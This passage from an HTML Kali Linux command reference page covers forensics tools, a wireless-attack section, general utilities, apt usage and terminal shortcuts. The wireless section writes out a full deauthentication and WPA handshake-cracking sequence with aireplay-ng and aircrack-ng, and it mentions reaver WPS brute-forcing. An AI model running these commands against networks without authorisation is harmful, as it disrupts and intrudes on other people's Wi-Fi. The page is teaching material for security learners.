+    <section class="section" id="forensics">
+        <span class="section-number">10 · FORENSICS &amp; ANALYSIS</span>
+        <h2 class="section-title">
+            <span class="icon">🔬</span>
+            Digital Forensics &amp; Traffic Analysis
+        </h2>
+        <p>
+            Forensics and packet analysis help you understand what happened — essential for incident response and post-exploitation.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🦈</span>wireshark</div>
+                <p>GUI packet analyzer — the gold standard for network forensics.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📦</span>tcpdump</div>
+                <p>Command-line packet capture. Works everywhere, even without GUI.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔍</span>strings</div>
+                <p>Extract readable strings from binary files — great for malware analysis.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📊</span>binwalk</div>
+                <p>Analyze firmware images and extract embedded files.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🕵️</span>foremost</div>
+                <p>Recover deleted files by file signature (carving).</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🗂️</span>volatility</div>
+                <p>Memory forensics framework — analyze RAM dumps.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Capture packets with tcpdump</span>
+<span class="cmd">sudo</span> tcpdump -i eth0 -w capture.pcap
+
+<span class="cmt"># Read a pcap file</span>
+<span class="cmd">sudo</span> tcpdump -r capture.pcap -nn
+
+<span class="cmt"># Extract strings from a binary</span>
+<span class="cmd">strings</span> malware.bin | <span class="cmd">grep</span> -i password
+
+<span class="cmt"># Analyze firmware</span>
+<span class="cmd">binwalk</span> firmware.bin
+
+<span class="cmt"># Recover deleted files</span>
+<span class="cmd">foremost</span> -i disk.img -o output/</code>
+        </div>
+    </section>
+
+    <!-- ===== 11 WIRELESS ===== -->
+    <section class="section" id="wireless">
+        <span class="section-number">11 · WIRELESS ATTACKS</span>
+        <h2 class="section-title">
+            <span class="icon">📶</span>
+            Wireless Network Attacks
+        </h2>
+        <p>
+            Wireless networks are a common attack vector. These Kali tools help you audit Wi-Fi security.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📡</span>aircrack-ng</div>
+                <p>Complete suite for Wi-Fi auditing — capture, crack, deauth.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📻</span>airodump-ng</div>
+                <p>Capture Wi-Fi packets and list nearby networks.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📤</span>aireplay-ng</div>
+                <p>Inject packets — deauth attacks, fake authentication.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔨</span>reaver</div>
+                <p>WPS PIN brute-force attack against routers.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Enable monitor mode</span>
+<span class="cmd">sudo</span> airmon-ng start wlan0
+
+<span class="cmt"># Scan for networks</span>
+<span class="cmd">sudo</span> airodump-ng wlan0mon
+
+<span class="cmt"># Capture handshake on specific channel</span>
+<span class="cmd">sudo</span> airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+<span class="cmt"># Send deauth packets to force handshake</span>
+<span class="cmd">sudo</span> aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="cmt"># Crack the handshake</span>
+<span class="cmd">aircrack-ng</span> -w /usr/share/wordlists/rockyou.txt capture-01.cap</code>
+        </div>
+    </section>
+
+    <!-- ===== 12 MISC ===== -->
+    <section class="section" id="misc">
+        <span class="section-number">12 · MISC &amp; UTILITIES</span>
+        <h2 class="section-title">
+            <span class="icon">🧰</span>
+            Miscellaneous Utilities
+        </h2>
+        <p>
+            Odds and ends that every hacker should know — text processing, file compression, and system info.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">✂️</span>grep / awk / sed</div>
+                <p>The text processing triad. Master these and you can parse anything.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📦</span>tar / gzip / zip</div>
+                <p>Archive and compress files. <code>tar -xzvf</code> is your friend.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔐</span>openssl</div>
+                <p>Crypto toolkit — generate keys, encrypt files, test SSL/TLS.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📅</span>date / cal</div>
+                <p>Show current date/time or calendar.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📝</span>echo / printf</div>
+                <p>Print text to terminal or files.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📜</span>history</div>
+                <p>Show previously executed commands. <code>history | grep nmap</code>.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔢</span>seq / bc</div>
+                <p>Generate number sequences / calculator. Great for scripting.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📋</span>tee</div>
+                <p>Send output to both terminal and file at the same time.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔤</span>base64</div>
+                <p>Encode/decode Base64 — useful in payload crafting.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🌐</span>xxd / hexdump</div>
+                <p>View files in hexadecimal format.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Extract and decompress</span>
+<span class="cmd">tar</span> -xzvf archive.tar.gz
+<span class="cmd">unzip</span> file.zip
+
+<span class="cmt"># Generate RSA key</span>
+<span class="cmd">openssl</span> genrsa -out private.key 2048
+<span class="cmd">openssl</span> rsa -in private.key -pubout -out public.key
+
+<span class="cmt"># Base64 encode/decode</span>
+<span class="cmd">echo</span> <span class="str">"hello"</span> | <span class="cmd">base64</span>
+<span class="cmd">echo</span> <span class="str">"aGVsbG8K"</span> | <span class="cmd">base64</span> -d
+
+<span class="cmt"># Save and view output simultaneously</span>
+<span class="cmd">nmap</span> -sV 192.168.1.1 | <span class="cmd">tee</span> scan.txt
+
+<span class="cmt"># Extract a specific column with awk</span>
+<span class="cmd">cat</span> /etc/passwd | <span class="cmd">awk</span> -F: <span class="str">'{print $1, $3}'</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 13 APT ===== -->
+    <section class="section" id="apt">
+        <span class="section-number">13 · PACKAGE MANAGEMENT</span>
+        <h2 class="section-title">
+            <span class="icon">📦</span>
+            Installing &amp; Managing Tools
+        </h2>
+        <p>
+            Kali Linux uses Debian's <code>apt</code> package manager. Keep your tools updated and install new ones easily.
+        </p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Update package lists</span>
+<span class="cmd">sudo</span> apt update
+
+<span class="cmt"># Upgrade installed packages</span>
+<span class="cmd">sudo</span> apt upgrade -y
+<span class="cmd">sudo</span> apt full-upgrade -y
+
+<span class="cmt"># Install a package</span>
+<span class="cmd">sudo</span> apt install nmap
+
+<span class="cmt"># Remove a package</span>
+<span class="cmd">sudo</span> apt remove toolname
+<span class="cmd">sudo</span> apt autoremove
+
+<span class="cmt"># Search for a package</span>
+<span class="cmd">apt</span> search wireshark
+
+<span class="cmt"># Show package info</span>
+<span class="cmd">apt</span> show nmap
+
+<span class="cmt"># List installed packages</span>
+<span class="cmd">dpkg</span> -l | <span class="cmd">grep</span> nmap</code>
+        </div>
+
+        <div class="callout info">
+            <strong>💡 Pro Tip:</strong> Kali includes a meta-package called <code>kali-linux-everything</code> that installs all tools. But it's huge (50GB+) — most users only need the default installation.
+        </div>
+    </section>
+
+    <!-- ===== 14 SHORTCUTS ===== -->
+    <section class="section" id="shortcuts">
+        <span class="section-number">14 · TERMINAL SHORTCUTS</span>
+        <h2 class="section-title">
+            <span class="icon">⌨️</span>
+            Speed Up Your Workflow
+        </h2>
+        <p>
+            These keyboard shortcuts will make you dramatically faster in the terminal.
+        </p>
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Shortcut</th><th>Action</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>Ctrl + C</code></td><td>Kill current running command</td></tr>
+                    <tr><td><code>Ctrl + Z</code></td><td>Suspend current command (resume with <code>fg</code>)</td></tr>
+                    <tr><td><code>Ctrl + D</code></td><td>Exit terminal (or send EOF)</td></tr>
+                    <tr><td><code>Ctrl + L</code></td><td>Clear the screen (same as <code>clear</code>)</td></tr>
+                    <tr><td><code>Ctrl + A</code></td><td>Move cursor to start of line</td></tr>
+                    <tr><td><code>Ctrl + E</code></td><td>Move cursor to end of line</td></tr>
+                    <tr><td><code>Ctrl + U</code></td><td>Delete from cursor to start of line</td></tr>
+                    <tr><td><code>Ctrl + K</code></td><td>Delete from cursor to end of line</td></tr>
+                    <tr><td><code>Ctrl + W</code></td><td>Delete word before cursor</td></tr>
+                    <tr><td><code>Ctrl + R</code></td><td>Search command history (reverse search)</td></tr>
+                    <tr><td><code>Tab</code></td><td>Auto-complete commands and file paths</td></tr>
+                    <tr><td><code>Tab Tab</code></td><td>Show all possible completions</td></tr>
+                    <tr><td><code>!!</code></td><td>Repeat last command</td></tr>
+                    <tr><td><code>!nmap</code></td><td>Run last command starting with "nmap"</td></tr>
+                    <tr><td><code>Alt + .</code></td><td>Insert last argument of previous command</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Most useful tricks</span>
+<span class="cmd">sudo</span> !!              <span class="cmt"># Re-run last command with sudo</span>
+<span class="cmd">!!</span>                    <span class="cmt"># Re-run last command</span>
+<span class="cmd">history</span> | <span class="cmd">grep</span> nmap  <span class="cmt"># Find old nmap commands</span>
+<span class="cmd">cd</span> -                    <span class="cmt"># Go to previous directory</span>
+<span class="cmd">mv</span> file.txt{,.bak}    <span class="cmt"># Rename file.txt → file.txt.bak</span>
+<span class="cmd">touch</span> file{1..10}.txt <span class="cmt"># Create 10 files in one command</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 15 CONCLUSION ===== -->
+    <section class="section" id="conclusion">
+        <span class="section-number">15 · CONCLUSION</span>
+        <h2 class="section-title">
+            <span class="icon">🎓</span>
+            Final Thoughts
+        </h2>
+        <p>
+            Kali Linux commands are the <strong>foundation of your ethical hacking career</strong>. No matter how advanced the GUI tools become, the terminal remains the fastest, most powerful, and most scriptable way to get things done.
+        </p>
+        <p>
+            Start with the basics — navigation, files, permissions. Then move into network tools and scanning. Before you know it, you'll be chaining commands together like a pro.
+        </p>
+        <p>
+            Remember the golden rule: <strong>practice daily</strong>. Set up a lab (VirtualBox + Kali + Metasploitable), and try a new command every day. Within weeks, the terminal will feel like home.
+        </p>
+
+        <h3>Key Takeaways</h3>
+        <ul>
+            <li>Master navigation first — <code>ls</code>, <code>cd</code>, <code>pwd</code>, <code>find</code>.</li>
+            <li>Understand permissions — <code>chmod</code>, <code>chown</code>, and octal notation.</li>
+            <li>Learn Nmap deeply — it's the most important scanning tool.</li>
+            <li>Practice text processing — <code>grep</code>, <code>awk</code>, <code>sed</code>.</li>
+            <li>Automate everything — turn commands into Bash scripts.</li>
+            <li>Always stay legal — only test systems you own or have permission for.</li>
+        </ul>
+
+        <div class="callout">
+            <strong>🚀 Next Steps:</strong> Open a Kali VM, open a terminal, and start typing. The more you use these commands, the more they'll stick. Bookmark this page as your daily reference.
+        </div>
+
+        <p style="text-align:center; margin-top: 30px; font-size: 17px; color: #00ff88; font-weight: 600;">
+            Happy hacking — ethically. 🐉
+        </p>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="page-footer">
+        <p>© 2025 · <span class="brand">⚡ cyber·sume</span> · Kali Linux Commands Reference</p>
+        <p style="margin-top: 8px; font-size: 12px;">Complete Guide · Beginner to Advanced · Updated 2025</p>
+    </footer>
 
 </div>
+
+</body>
+</html>
